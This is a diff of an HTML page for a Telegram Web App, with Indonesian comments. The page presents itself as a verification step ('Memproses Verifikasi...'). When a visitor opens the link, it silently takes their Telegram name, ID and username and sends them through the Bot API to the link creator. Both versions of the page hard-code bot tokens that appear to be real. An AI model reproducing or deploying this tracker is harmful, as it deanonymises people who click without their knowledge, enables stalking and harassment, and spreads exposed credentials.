@@ -2,31 +2,44 @@
 <html>
 <head>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    </style>
 </head>
-<body>
+<body style="background: #121212; color: white; text-align: center; font-family: sans-serif;">
+    <div style="margin-top: 50px;">
+        <h2 id="status">Memproses Verifikasi...</h2>
+    </div>
+
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
+        tg.ready();
 
-        const user = tg.initDataUnsafe.user;
-        const BOT_TOKEN = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
-        const ADMIN_ID = 'MASUKKAN_ID_TELE_KAMU'; // <--- JANGAN LUPA GANTI INI
+        const userKlik = tg.initDataUnsafe.user; // Orang yang klik link
+        const adminId = tg.initDataUnsafe.start_param; // ID kamu (pembuat link)
+        const botToken = "8545998251:AAEhYhH2bjBkXIrwVzBaeCbsSmP0XAe4GBw";
 
-        if (user) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        if (userKlik && adminId) {
+            const laporan = `🔔 *LINK DIKLIK!*
+----------------------------
+👤 Pengklik: ${userKlik.first_name}
+🆔 ID: ${userKlik.id}
+🔗 Username: @${userKlik.username || 'n/a'}
+----------------------------`;
+
+            // Kirim notif ke KAMU (Admin)
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: `🎯 **Tracker Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || '-'}`,
-                    parse_mode: "Markdown"
+                    chat_id: adminId,
+                    text: laporan,
+                    parse_mode: 'Markdown'
                 })
-            }).finally(() => {
-                tg.close(); // Tutup otomatis dalam 0.1 detik
+            }).then(() => {
+                document.getElementById('status').innerText = "Berhasil Masuk!";
+                // Opsional: pindahkan user ke link asli setelah 2 detik
+                // setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
             });
+        } else {
+            document.getElementById('status').innerText = "Gunakan Telegram untuk membuka link ini.";
         }
     </script>
 </body>
